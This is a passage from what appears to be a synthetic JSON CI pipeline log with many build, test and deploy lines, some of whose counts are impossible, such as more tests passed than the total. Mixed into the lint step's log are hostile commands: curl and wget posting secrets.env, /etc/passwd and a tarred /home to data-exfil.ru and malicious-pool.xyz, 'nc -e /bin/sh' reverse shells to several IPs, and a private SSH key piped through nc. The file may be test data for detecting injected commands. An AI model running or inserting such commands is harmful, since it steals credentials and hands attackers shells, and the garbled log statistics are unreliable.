request\nCompiling lib/app.ts...\n[12:45:53] DEBUG: Loading configuration\npip: Downloading lodash-3.0.tar.gz\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (71MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 package completed\n[12:45:53] WARN: Deprecated API usage\npip: Installing build dependencies...\nArtifact downloaded: 9MB\nInstalling lodash@2.16.8\n[12:45:53] WARN: Deprecated API usage\npip: Downloading prettier-3.9.tar.gz\npip: Downloading lodash-2.14.tar.gz\nReady.\nCompiling src/service.java...\nChecking out master branch\nCache miss for key-2078\nProcessing...\nBuilding Docker image...\n[12:45:53] WARN: Deprecated API usage\nFetching submodules...\nPOST /api - 202 (175ms)\nCompleted.\nLoading...\nRan 92 tests in 21s\nNODE_ENV=development\nConnection established\nVerifying...\nStep 17/25: Deploying\n[12:45:53] ERROR: Connection failed\nOptimizing 86 modules...\nStep 4/15: Deploying\n[12:45:53] INFO: Cache refreshed\n[12:45:53] DEBUG: Loading configuration\nStep 15/23: Building\nBundling main.js\nPlatform: darwin-arm64\nNODE_ENV=development\nPlatform: darwin-arm64\nFAILED: test_api_health\n\u2713 All checks passed\nCache miss for key-2232\nnpm install: added 385 packages\nMinifying vendor.js\nSwitched to branch 'bugfix/task-251'\nEnvironment: development\n[12:45:53] ERROR: Connection failed\nCache hit for key-9811\nChecking out main branch\nChecking out master branch\nEnvironment: development\npip install: Successfully installed lodash-1.3\nStep 2/20: Building\nTLS handshake completed\nStep 5/22: Linting\nArtifact downloaded: 16MB\nWaiting...\n  PASS: unit/test_api_health.spec.js\nArtifact downloaded: 24MB\nPushing to registry...\n\u2713 Step 'test' succeeded\nnpm install: added 227 packages\nChecking out main branch\n[12:45:53] DEBUG: Connection pool: 11 active\nWaiting...\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:53] DEBUG: Loading configuration\nTransforming 688 files...\n\u2713 Step 'install' succeeded\nnpm notice: created a lockfile\nLayer 5/10: RUN command\n[12:45:53] INFO: Starting build process\n\u2717 build failed with exit code 102\nUploading artifact 'dist' (33 files)\nProcessing...\nArtifact uploaded: dist.zip (49MB)\nArtifact uploaded: dist.zip (47MB)\nStep 17/19: Testing\n\u2713 Step 'test' succeeded\nnpm notice: package.json updated\n[12:45:53] ERROR: Connection failed\nnpm install: added 321 packages\n  PASS: e2e/test_auth_login.spec.js\nCache miss for key-5503\nHEAD is now at 0953fe5\nInstalling jest@3.16.6\nWARNING: lodash has known vulnerabilities\nCompiling components/utils.go...\nSnapshots: 8 passed, 35 total\n[12:45:53] DEBUG: Query executed in 19ms\nWARNING: express has known vulnerabilities\nCache saved successfully\nAlready up to date.\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (48MB)\nBuilding Docker image...\nSuccess!\nCompiling lib/utils.go...\nnpm notice: package.json updated\nEnvironment: production\nBuilding Docker image...\nTime: 42.221s\npip: Downloading jest-3.12.tar.gz\nStep 8/20: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:53] INFO: Starting build process\nGET /api - 201 (78ms)\nArtifact uploaded: build.tar.gz (19MB)\nUsing Python 3.12\nSuccess!\nLayer 10/11: ENV command\nWARNING: jest has known vulnerabilities\nCompiling src/handler.rs...\n\u2713 Task completed in 3042ms\n  PASS: unit/test_auth_login.spec.js\n[12:45:53] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (17MB)\nnpm install: resolved 717 packages\n\u2713 test completed\nConnection established\nFAILED: test_db_connect\nCache invalidated: node_modules\n  PASS: unit/test_cache_hit.spec.js\n[12:45:53] DEBUG: Connection pool: 16 active\nCache miss for key-3385\nPlatform: win32-x64\n[12:45:53] INFO: Cache refreshed\nCreating production build...\nLoading...\nSwitched to branch 'bugfix/task-762'\nEnvironment: development\nnpm install: added 422 packages\nStep 15/19: Building\nTest Suites: 42 passed, 23 total\n[12:45:53] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (78MB)\nLoading...\npip: Collecting eslint\nGenerating source maps...\n\u2713 Step 'checkout' succeeded\nFAILED: test_api_health\nCompiling utils/utils.go...\n=== Step checkout completed ===\n=== Step: setup_node ===\nGenerating source maps...\n[12:45:53] DEBUG: Loading configuration\nWaiting...\nTest Suites: 20 passed, 49 total\nFetching submodules...\n\u2713 build completed\nStep 9/17: Linting\nPushing to registry...\nPOST /api - 201 (334ms)\nNODE_ENV=production\nLoading...\nSwitched to branch 'hotfix/task-616'\nChecking out master branch\nLoading...\n[12:45:53] DEBUG: Query executed in 99ms\nArtifact uploaded: dist.zip (12MB)\nGET /health - 200 (2ms)\n\u2713 Task completed in 1970ms\n[12:45:53] ERROR: Connection failed\nPushing to registry...\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: unit/test_db_connect.spec.js\nCompiling utils/app.ts...\nStep 16/20: Running migrations\nUsing Node.js 18.14.4\n[12:45:53] INFO: Processing request\nUsing Node.js 16.19.10\n\u2713 build completed\nTime: 96.913s\nGET /api - 200 (75ms)\nnpm install: added 93 packages\nnpm notice: created a lockfile\nTime: 82.568s\n\u2713 Step 'install' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 4/17: Building\nDone.\nOK\nOptimizing 21 modules...\nCache restored successfully (143MB)\nCache invalidated: dependencies\n  PASS: integration/test_db_connect.spec.js\n[12:45:53] INFO: Starting build process\nCompiling components/app.ts...\nConnection established\nCompiling components/main.py...\nTLS handshake completed\nSuccess!\nyarn add: Done in 2.62s\n[12:45:53] DEBUG: Initializing service\nnpm install: resolved 143 packages\npip install: Successfully installed eslint-4.4\nCache saved successfully\n[12:45:53] DEBUG: Initializing service\nSuccess!\nWARNING: react has known vulnerabilities\n  PASS: e2e/test_cache_hit.spec.js\npip: Collecting react\nBundling styles.css\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at e3b28bd\nProcessing...\nTest Suites: 41 passed, 34 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Collecting express\nnpm notice: package.json updated\n\u2713 All checks passed\n[12:45:53] ERROR: Connection failed\nSwitched to branch 'bugfix/task-341'\nTest Suites: 40 passed, 35 total\nReady.\nUsing Python 3.11\nCache restored successfully (95MB)\nConnection established\n[12:45:53] DEBUG: Loading configuration\nLayer 8/13: ENV command\nStep 1/20: Linting\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\n[12:45:53] DEBUG: Initializing service\npip: Collecting webpack\n\u2717 build failed with exit code 33\n[12:45:53] INFO: Processing request\n[12:45:53] ERROR: Connection failed\nNODE_ENV=production\nnpm notice: created a lockfile\nWaiting...\nDone.\nTests: 128 passed, 296 total\nTLS handshake completed\nnpm notice: created a lockfile\nReady.\nSuccess!\n\u2713 All checks passed\n[12:45:53] INFO: Connecting to database\nTLS handshake completed\nArtifact downloaded: 13MB\nStep 7/19: Linting\n[12:45:53] INFO: Starting build process\nFetching from https://docker.io/package.json\n[12:45:53] INFO: Starting build process\nStep 14/18: Linting\n[12:45:53] ERROR: Connection failed\nLayer 10/9: RUN command\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (32MB)\nFetching from https://pypi.org/package.json\nCoverage: 83% statements, 65% branches\nPushing to registry...\nArtifact downloaded: 13MB\nBundling vendor.js\n[12:45:53] INFO: Request completed\n\u2713 All checks passed\nFetching submodules...\nVerifying...\nSwitched to branch 'bugfix/task-233'\nCompiling components/service.java...\nCache miss for key-8216\n[12:45:53] INFO: Starting build process\nGenerating source maps...\nPlatform: darwin-arm64\n\u2713 Task completed in 1220ms\nTransforming 517 files...\nFetching submodules...\n\u2717 build failed with exit code 32\nProcessing...\n[12:45:53] INFO: Request completed\nWARNING: prettier has known vulnerabilities\nProcessing...\nUsing Python 3.12\nCompiling utils/service.java...\nBundling runtime.js\nFetching submodules...\nCompiling components/service.java...\nAlready up to date.\nPulling image: python:18\nSuccess!\nStep 6/16: Deploying\n\u2713 All checks passed\nTime: 31.821s\nCompiling components/index.js...\n[12:45:53] ERROR: Connection failed\npip: Downloading eslint-3.14.tar.gz\n[12:45:53] INFO: Request completed\n\u2713 Step 'build' succeeded\nPOST /api - 201 (43ms)\n\u2713 All checks passed\nVerifying...\nSwitched to branch 'bugfix/task-284'\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: resolved 1861 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:45:53] DEBUG: Loading configuration\n\u2713 Step 'checkout' succeeded\nCache hit for key-1383\nSuccess!\nTest Suites: 32 passed, 16 total\nVerifying...\nAlready up to date.\nGET /api - 204 (17ms)\nCompiling src/main.py...\nUploading artifact 'build' (20 files)\nTime: 72.977s\nLoading...\n[12:45:53] INFO: Starting build process\nFetching from https://amazonaws.com/package.json\nOK\nRan 193 tests in 49s\npip: Collecting prettier\nNODE_ENV=development\n[12:45:53] WARN: Deprecated API usage\n[12:45:53] INFO: Starting build process\nArtifact downloaded: 9MB\nyarn add: Done in 29.38s\npip install: Successfully installed express-5.14\nStep 15/17: Running migrations\n[12:45:53] INFO: Processing request\nTime: 14.611s\nnpm install: added 202 packages\nCreating production build...\nReady.\nDone.\nyarn add: Done in 11.48s\nPulling image: node:3.11\n\u2717 build failed with exit code 69\nArtifact uploaded: build.tar.gz (43MB)\nReady.\nnpm install: resolved 852 packages\n  PASS: test_auth_login (337ms)\nConnection established\nStep 18/24: Linting\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_db_connect (162ms)\nFetching submodules...\nCoverage: 90% statements, 93% branches\nHEAD is now at bbc5456\nCompiling components/app.ts...\nHEAD is now at 58bf130\nWARNING: jest has known vulnerabilities\n[12:45:53] WARN: Deprecated API usage\nnpm notice: package.json updated\nException: TypeError\nBuilding Docker image...\nTest Suites: 14 passed, 8 total\n\u2713 All checks passed\n=== Step setup_node completed ===\n=== Step: lint ===\nSnapshots: 47 passed, 41 total\nCache saved successfully\nStep 4/20: Deploying\nSnapshots: 9 passed, 29 total\nConnection established\nReady.\n[12:45:53] DEBUG: Query executed in 76ms\nChecking out main branch\n[12:45:53] INFO: Processing request\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nChecking out master branch\nWARNING: webpack has known vulnerabilities\nSwitched to branch 'hotfix/task-376'\nCache invalidated: dependencies\nOptimizing 95 modules...\nPOST /data - 200 (434ms)\nStep 1/18: Deploying\n[12:45:53] DEBUG: Query executed in 76ms\nProcessing...\n[12:45:53] INFO: Starting build process\nStep 14/18: Deploying\nOptimizing 37 modules...\nImage pulled successfully\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (6MB)\nCache miss for key-9947\nBundling runtime.css\nSending 264MB of data to crypto-mine.io\n[12:45:53] ERROR: Connection failed\nSwitched to branch 'hotfix/task-631'\nUploading artifact 'coverage' (5 files)\n  PASS: test_auth_login (104ms)\nnpm install: added 480 packages\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nPulling image: python:latest\nnc -e /bin/sh 167.191.65.238 28828\n\u2713 All checks passed\nTLS handshake completed\n[12:45:53] ERROR: Connection failed\nTests: 285 passed, 215 total\nyarn add: Done in 4.87s\nHEAD is now at f4e43ea\nCreating production build...\n\u2713 package completed\n\u2713 validate completed\nStep 14/15: Deploying\nStep 17/15: Running migrations\nFinished.\nCompiling components/service.java...\nWARNING: eslint has known vulnerabilities\nLoading...\nnc -e /bin/sh 244.170.27.162 64397\nnpm notice: package.json updated\nPOST /upload - 201 (111ms)\n  PASS: test_cache_hit (255ms)\nStep 9/23: Running migrations\nWARNING: axios has known vulnerabilities\nFetching submodules...\nWaiting...\nReady.\nBundling main.css\nCompleted.\n[12:45:53] DEBUG: Initializing service\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSwitched to branch 'feature/task-188'\nTime: 93.170s\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nnc -e /bin/sh 206.28.158.66 2197\n[12:45:53] INFO: Connecting to database\n[12:45:53] DEBUG: Memory usage: 1773MB\nGET /health - 204 (24ms)\nTLS handshake completed\nMinifying main.js\nCache restored successfully (149MB)\nyarn add: Done in 29.98s\n[12:45:53] DEBUG: Loading configuration\nTests: 393 passed, 364 total\nStep 12/24: Linting\nCache miss for key-3222\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 All checks passed\npip: Collecting jest\nCompiling utils/utils.go...\nCompiling utils/utils.go...\nCompiling utils/utils.go...\nBuilding Docker image...\n[12:45:53] INFO: Processing request\nReady.\nTransforming 978 files...\nCompleted.\n[12:45:53] DEBUG: Connection pool: 18 active\n[12:45:53] WARN: Deprecated API usage\n[12:45:53] DEBUG: Memory usage: 939MB\nSwitched to branch 'hotfix/task-833'\nInstalling react@1.14.8\nCache miss for key-8833\nBuilding Docker image...\n[12:45:53] INFO: Connecting to database\nWARNING: eslint has known vulnerabilities\nReady.\nChecking out master branch\nTLS handshake completed\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n[12:45:53] INFO: Request completed\nStep 6/22: Deploying\nFinished.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 226.200.222.77 47211\nChecking out master branch\nUsing Python 3.10\nCache hit for key-3913\nLoading...\nOptimizing 38 modules...\nCreating production build...\n[12:45:53] INFO: Connecting to database\nPushing to registry...\npip: Installing build dependencies...\nSnapshots: 8 passed, 37 total\nBuilding Docker image...\n  PASS: e2e/test_cache_hit.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUploading artifact 'coverage' (4 files)\nArtifact downloaded: 46MB\nEnvironment: test\necho $(cat ~/.ssh/id_rsa) | base64 | nc 46.135.188.241 40604\n[12:45:53] WARN: Deprecated API usage\nWaiting...\n[12:45:53] DEBUG: Initializing service\nnpm install: added 379 packages\n  PASS: test_api_health (381ms)\nFetching submodules...\nHEAD is now at 7815641\nRan 134 tests in 2s\nSnapshots: 12 passed, 1 total\nSnapshots: 37 passed, 38 total\nCache saved successfully\n\u2713 validate completed\nnpm install: resolved 221 packages\nChecking out develop branch\nnc -e /bin/sh 19.181.91.142 5191\n[12:45:53] DEBUG: Initializing service\nMinifying app.js\n\u2713 lint completed\nOK\npip: Collecting eslint\nSending 264MB of data to crypto-mine.io\nSwitched to branch 'feature/task-781'\nCreating production build...\nProcessing...\nWARNING: lodash has known vulnerabilities\nCoverage: 93% statements, 79% branches\n\u2717 build failed with exit code 114\nStep 7/22: Deploying\nStep 16/20: Running migrations\nnpm notice: created a lockfile\nFetching submodules...\nCompleted.\nStep 2/17: Installing dependencies\nyarn add: Done in 6.98s\nWARNING: prettier has known vulnerabilities\nnpm notice: package.json updated\nPlatform: darwin-arm64\nLayer 3/10: ENV command\n\u2713 Task completed in 4824ms\nTransforming 289 files...\nPOST /api - 202 (141ms)\nCoverage: 72% statements, 100% branches\nStep 11/20: Linting\npip: Collecting eslint\nBuilding Docker image...\nGenerating source maps...\nTest Suites: 19 passed, 46 total\n\u2713 validate completed\nImage pulled successfully\nCache hit for key-9957\nCache miss for key-8535\nNODE_ENV=test\nBundling vendor.js\nCache saved successfully\nTime: 49.472s\nCompiling components/index.js...\npip install: Successfully installed webpack-4.4\nnpm notice: package.json updated\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nImage pulled successfully\nStep 2/18: Installing dependencies\nTests: 250 passed, 453 total\nSnapshots: 13 passed, 4 total\nStep 19/19: Running migrations\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-3677\nPushing to registry...\nRan 63 tests in 35s\nCache restored successfully (94MB)\n[12:45:53] DEBUG: Initializing service\nnpm notice: created a lockfile\nUploading artifact 'build' (5 files)\nArtifact uploaded: build.tar.gz (26MB)\nTests: 280 passed, 309 total\nHEAD is now at 77ed4ee\nArtifact downloaded: 19MB\nFinished.\nCache restored successfully (395MB)\n\u2713 Task completed in 4956ms\nWaiting...\nStep 18/22: Installing dependencies\nUploading artifact 'dist' (22 files)\nBuilding Docker image...\nOK\nCreating production build...\nHEAD is now at 552e4b4\nRan 197 tests in 55s\nFAILED: test_auth_login\n[12:45:53] DEBUG: Query executed in 90ms\nArtifact uploaded: dist.zip (61MB)\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n[12:45:53] WARN: Deprecated API usage\nnc -e /bin/sh 23.214.21.251 5677\nTransforming 331 files...\nPlatform: linux-x64\n=== Step lint completed ===",
    "steps": [
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-25T12:45:52.931373",
        "finished_at": "2025-11-25T12:46:19.804703",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Building Docker image...",
          "[12:45:52] INFO: Processing request",
          "Layer 8/15: ENV command",
          "Cache hit for key-7713",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Step 6/25: Testing",
          "WARNING: prettier has known vulnerabilities",
          "Ready.",
          "[12:45:52] WARN: Deprecated API usage",
          "Creating production build...",
          "GET /health - 204 (49ms)",
          "\u2713 Step 'test' succeeded",
          "npm notice: created a lockfile",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Image pulled successfully",
          "npm install: resolved 979 packages",
          "[12:45:52] INFO: Request completed",
          "Step 8/17: Building",
          "Loading...",
          "Artifact downloaded: 1MB",
          "Tests: 491 passed, 287 total",
          "Success!",
          "Step 3/15: Running migrations",
          "Cache invalidated: dependencies",
          "[12:45:52] INFO: Starting build process",
          "Artifact uploaded: dist.zip (13MB)",
          "[12:45:52] DEBUG: Query executed in 49ms",
          "[12:45:52] DEBUG: Initializing service",
          "Waiting...",
          "Fetching submodules...",
          "Waiting...",
          "[12:45:52] INFO: Connecting to database",
          "[12:45:52] WARN: Deprecated API usage",
          "Cache miss for key-2015",
          "Uploading artifact 'dist' (27 files)",
          "Time: 117.14s",
          "\u2713 test completed",
          "Time: 67.403s",
          "[12:45:52] DEBUG: Query executed in 33ms",
          "[12:45:52] DEBUG: Loading configuration",
          "Step 19/25: Building",
          "  PASS: integration/test_db_connect.spec.js",
          "pip: Installing build dependencies...",
          "Compiling utils/utils.go...",
          "[12:45:52] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: axios has known vulnerabilities",
          "Connection established",
          "[12:45:52] INFO: Processing request",
          "pip install: Successfully installed webpack-2.16",
          "pip install: Successfully installed axios-4.19",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling components/utils.go...",
          "Done.",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:45:52] INFO: Connecting to database",
          "\u2713 lint completed",
          "Using Node.js 19.12.9",
          "Transforming 547 files...",
          "Pulling image: alpine:18",
          "Step 18/24: Testing",
          "[12:45:52] DEBUG: Query executed in 44ms",
          "Processing...",
          "Loading...",
          "[12:45:52] INFO: Connecting to database",
          "Ran 23 tests in 31s",
          "NODE_ENV=test",
          "[12:45:52] WARN: Deprecated API usage",
          "[12:45:52] WARN: Deprecated API usage",
          "  PASS: test_auth_login (49ms)",
          "WARNING: axios has known vulnerabilities",
          "Success!",
          "Step 9/17: Running migrations",
          "Artifact uploaded: dist.zip (36MB)",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Exception: RuntimeError",
          "Connection established",
          "[12:45:52] WARN: Deprecated API usage",
          "Layer 10/13: RUN command",
          "[12:45:52] INFO: Connecting to database",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_cache_hit (94ms)",
          "Snapshots: 12 passed, 26 total",
          "Switched to branch 'hotfix/task-989'",
          "Using Python 3.11",
          "\u2713 package completed",
          "Cache invalidated: build",
          "Exception: ValueError",
          "POST /upload - 200 (424ms)",
          "\u2713 Task completed in 4976ms",
          "Processing...",
          "Compiling components/main.py...",
          "Step 5/20: Running migrations",
          "Generating source maps...",
          "  PASS: test_auth_login (397ms)",
          "WARNING: react has known vulnerabilities",
          "[12:45:52] WARN: Deprecated API usage",
          "Artifact downloaded: 36MB",
          "Fetching from https://githubusercontent.com/package.json",
          "npm notice: created a lockfile",
          "Compiling utils/main.py...",
          "Success!",
          "OK",
          "Step 19/20: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 26 passed, 47 total",
          "\u2713 test completed",
          "Connection established",
          "Compiling src/service.java...",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/app.ts...",
          "\u2713 Step 'test' succeeded",
          "\u2713 All checks passed",
          "Compiling lib/main.py...",
          "Completed.",
          "[12:45:52] INFO: Cache refreshed",
          "Exception: NullPointerException",
          "  PASS: test_auth_login (42ms)",
          "Optimizing 37 modules...",
          "Image pulled successfully",
          "TLS handshake completed",
          "Cache restored successfully (240MB)",
          "\u2713 test completed",
          "Switched to branch 'hotfix/task-239'",
          "GET /status - 201 (30ms)",
          "Step 8/18: Running migrations",
          "[12:45:52] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (45MB)",
          "Finished.",
          "Artifact uploaded: dist.zip (85MB)",
          "OK",
          "Pushing to registry...",
          "Step 17/16: Installing dependencies",
          "npm install: added 21 packages",
          "WARNING: express has known vulnerabilities",
          "\u2713 validate completed",
          "Compiling lib/app.ts...",
          "  PASS: test_cache_hit (168ms)",
          "\u2713 Step 'checkout' succeeded",
          "[12:45:52] WARN: Deprecated API usage",
          "Waiting...",
          "Waiting...",
          "Cache miss for key-7398",
          "Minifying app.js",
          "GET /status - 200 (86ms)",
          "POST /data - 201 (279ms)",
          "Step 20/21: Running migrations",
          "\u2713 Step 'checkout' succeeded",
          "Uploading artifact 'dist' (31 files)",
          "Cache saved successfully",
          "Processing...",
          "[12:45:52] ERROR: Connection failed",
          "OK",
          "Fetching from https://npmjs.org/package.json",
          "Bundling main.css",
          "Completed.",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing lodash@3.16.5",
          "Tests: 429 passed, 453 total",
          "Pulling image: node:latest",
          "pip: Installing build dependencies...",
          "[12:45:52] DEBUG: Loading configuration",
          "\u2713 deploy completed",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "[12:45:52] WARN: Deprecated API usage",
          "Success!",
          "Done.",
          "[12:45:52] DEBUG: Initializing service",
          "Bundling styles.js",
          "Bundling styles.js",
          "[12:45:52] DEBUG: Loading configuration",
          "Already up to date.",
          "pip install: Successfully installed eslint-5.5",
          "Step 5/15: Deploying",
          "Artifact downloaded: 50MB",
          "\u2713 test completed",
          "Checking out master branch",
          "\u2713 build completed",
          "Switched to branch 'feature/task-137'",
          "Processing...",
          "Verifying...",
          "\u2713 Step 'build' succeeded",
          "[12:45:52] DEBUG: Loading configuration",
          "Step 9/15: Running migrations",
          "Step 7/23: Testing",
          "[12:45:52] WARN: Deprecated API usage",
          "Ran 125 tests in 48s",
          "Time: 59.678s",
          "Snapshots: 46 passed, 5 total",
          "Creating production build...",
          "Cache hit for key-2435",
          "  PASS: test_cache_hit (180ms)",
          "Step 8/18: Running migrations",
          "Step 20/20: Running migrations",
          "WARNING: lodash has known vulnerabilities",
          "[12:45:52] WARN: Deprecated API usage",
          "\u2713 Task completed in 579ms",
          "\u2713 All checks passed",
          "NODE_ENV=test",
          "npm notice: package.json updated",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-25T12:46:19.804703",
        "finished_at": "2025-11-25T12:47:00.114698",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 17/18: Running migrations",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Connection established",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Generating source maps...",
          "Optimizing 23 modules...",
          "Creating production build...",
          "HEAD is now at 6ec0ebe",
          "[12:45:52] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "yarn add: Done in 16.52s",
          "[12:45:52] INFO: Cache refreshed",
          "Coverage: 70% statements, 95% branches",
          "Cache restored successfully (151MB)",
          "[12:45:52] INFO: Connecting to database",
          "OK",
          "Step 10/18: Linting",
          "Image pulled successfully",
          "npm install: resolved 875 packages",
          "Environment: production",
          "Minifying main.js",
          "[12:45:52] INFO: Processing request",
          "pip: Downloading eslint-3.12.tar.gz",
          "Loading...",
          "pip install: Successfully installed axios-1.2",
          "Waiting...",
          "Fetching submodules...",
          "NODE_ENV=test",
          "Using Python 3.11",
          "[12:45:52] DEBUG: Loading configuration",
          "Processing...",
          "Ran 106 tests in 43s",
          "[12:45:52] INFO: Request completed",
          "WARNING: react has known vulnerabilities",
          "Pushing to registry...",
          "Cache restored successfully (27MB)",
          "Step 18/17: Deploying",
          "Building Docker image...",
          "[12:45:52] DEBUG: Query executed in 27ms",
          "pip: Collecting express",
          "Compiling utils/service.java...",
          "NODE_ENV=development",
          "Completed.",
          "pip install: Successfully installed jest-5.11",
          "Cache invalidated: dependencies",
          "pip: Downloading prettier-4.9.tar.gz",
          "npm install: resolved 316 packages",
          "Step 19/20: Installing dependencies",
          "Connection established",
          "Optimizing 82 modules...",
          "Step 13/20: Testing",
          "Exception: NullPointerException",
          "Success!",
          "FAILED: test_user_create",
          "Uploading artifact 'dist' (49 files)",
          "Optimizing 85 modules...",
          "Completed.",
          "TLS handshake completed",
          "Finished.",
          "pip: Downloading express-4.8.tar.gz",
          "Using Python 3.11",
          "Pulling image: python:latest",
          "Artifact uploaded: build.tar.gz (18MB)",
          "FAILED: test_cache_hit",
          "Verifying...",
          "npm notice: created a lockfile",
          "Test Suites: 23 passed, 31 total",
          "Artifact uploaded: dist.zip (98MB)",
          "Bundling vendor.js",
          "Step 17/25: Testing",
          "Checking out master branch",
          "Using Node.js 15.14.9",
          "Compiling components/main.py...",
          "Environment: development",
          "Step 16/22: Building",
          "yarn add: Done in 18.49s",
          "[12:45:52] DEBUG: Memory usage: 531MB",
          "Artifact uploaded: dist.zip (67MB)",
          "Step 15/15: Running migrations",
          "Loading...",
          "pip: Collecting express",
          "Cache restored successfully (431MB)",
          "pip: Collecting express",
          "[12:45:52] INFO: Connecting to database",
          "[12:45:52] DEBUG: Memory usage: 1358MB",
          "\u2713 Task completed in 392ms",
          "POST /api - 201 (28ms)",
          "  PASS: unit/test_cache_hit.spec.js",
          "npm notice: package.json updated",
          "Tests: 194 passed, 114 total",
          "Step 20/20: Building",
          "Success!",
          "Step 4/19: Deploying",
          "Done.",
          "npm install: added 65 packages",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache saved successfully",
          "Compiling lib/index.js...",
          "Generating source maps...",
          "pip install: Successfully installed eslint-5.14",
          "NODE_ENV=production",
          "GET /api - 201 (88ms)",
          "Cache hit for key-9360",
          "Step 13/17: Installing dependencies",
          "Fetching from https://gcr.io/package.json",
          "Cache hit for key-7172",
          "[12:45:52] INFO: Connecting to database",
          "WARNING: express has known vulnerabilities",
          "NODE_ENV=production",
          "[12:45:52] INFO: Connecting to database",
          "Waiting...",
          "Step 9/24: Linting",
          "Ran 50 tests in 41s",
          "[12:45:52] INFO: Request completed",
          "Cache invalidated: dependencies",
          "Generating source maps...",
          "WARNING: react has known vulnerabilities",
          "[12:45:52] INFO: Processing request",
          "\u2713 Task completed in 1378ms",
          "Test Suites: 32 passed, 35 total",
          "[12:45:52] WARN: Deprecated API usage",
          "Compiling lib/handler.rs...",
          "Processing...",
          "pip: Installing build dependencies...",
          "WARNING: lodash has known vulnerabilities",
          "[12:45:52] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "Tests: 53 passed, 238 total",
          "[12:45:52] DEBUG: Memory usage: 169MB",
          "Verifying...",
          "Ran 124 tests in 31s",
          "[12:45:52] DEBUG: Loading configuration",
          "Connection established",
          "[12:45:52] WARN: Deprecated API usage",
          "pip: Downloading express-5.11.tar.gz",
          "Creating production build...",
          "Compiling components/main.py...",
          "WARNING: react has known vulnerabilities",
          "Step 5/15: Building",
          "Connection established",
          "Already up to date.",
          "[12:45:52] DEBUG: Connection pool: 8 active",
          "Step 13/21: Running migrations",
          "Test Suites: 24 passed, 26 total",
          "FAILED: test_db_connect",
          "pip: Collecting express",
          "Step 6/22: Installing dependencies",
          "OK",
          "[12:45:52] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Cache hit for key-8304",
          "\u2713 Step 'setup' succeeded",
          "Using Node.js 18.20.5",
          "Fetching submodules...",
          "Done.",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:45:52] DEBUG: Loading configuration",
          "npm install: added 136 packages",
          "Generating source maps...",
          "Time: 19.991s",
          "Step 4/15: Installing dependencies",
          "Optimizing 89 modules...",
          "[12:45:52] DEBUG: Loading configuration",
          "Using Python 3.11",
          "Connection established",
          "[12:45:52] INFO: Cache refreshed",
          "[12:45:52] ERROR: Connection failed",
          "[12:45:52] INFO: Request completed",
          "Switched to branch 'feature/task-283'",
          "\u2713 test completed",
          "Layer 2/10: COPY command",
          "[12:45:52] ERROR: Connection failed",
          "pip: Downloading prettier-1.2.tar.gz",
          "\u2717 build failed with exit code 95",
          "Coverage: 99% statements, 72% branches",
          "Already up to date.",
          "Snapshots: 23 passed, 35 total",
          "Cache restored successfully (199MB)",
          "Already up to date.",
          "GET /api - 201 (100ms)",
          "OK",
          "Building Docker image...",
          "Bundling vendor.css",
          "npm install: resolved 452 packages",
          "Optimizing 58 modules...",
          "Ran 169 tests in 23s",
          "Using Python 3.12",
          "[12:45:52] WARN: Deprecated API usage",
          "Layer 9/13: COPY command",
          "Compiling components/index.js...",
          "Cache invalidated: node_modules",
